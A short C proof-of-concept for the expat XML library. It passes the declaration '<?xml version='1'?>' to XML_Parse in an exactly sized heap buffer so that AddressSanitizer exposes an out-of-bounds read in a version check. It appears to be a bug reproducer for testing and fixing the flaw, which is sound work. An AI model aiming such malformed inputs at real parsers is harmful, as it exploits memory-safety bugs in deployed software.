/* PoC: out-of-bounds read reachable through the public XML_Parse API.
 *
 * The document below is ordinary XML in every respect except that the
 * version pseudo-attribute of the XML declaration holds the single
 * character "1" -- input the library itself accepted unchanged before
 * the version check was introduced, and which the check is supposed to
 * reject with a clean XML_ERROR_XML_DECL.
 *
 * The document is heap allocated with its exact size so that any read
 * past the final byte is visible to AddressSanitizer.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "expat.h"

int
main(void) {
  static const char doc[] = "<?xml version='1'?>\n<doc/>";
  char *const buffer = (char *)malloc(sizeof(doc) - 1);
  XML_Parser parser;
  enum XML_Status status;

  if (buffer == NULL)
    return 2;
  memcpy(buffer, doc, sizeof(doc) - 1);

  parser = XML_ParserCreate(NULL);
  if (parser == NULL) {
    free(buffer);
    return 2;
  }
  status = XML_Parse(parser, buffer, (int)(sizeof(doc) - 1), XML_TRUE);
  printf("XML_Parse status=%d error=%s\n", status,
         XML_ErrorString(XML_GetErrorCode(parser)));
  XML_ParserFree(parser);
  free(buffer);
  return 0;
}
